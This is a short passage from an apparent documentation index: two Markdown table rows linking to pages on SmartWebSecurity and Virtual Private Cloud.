| [smartwebsecurity.md](smartwebsecurity.md) | SmartWebSecurity |
| [vpc.md](vpc.md) | Virtual Private Cloud |
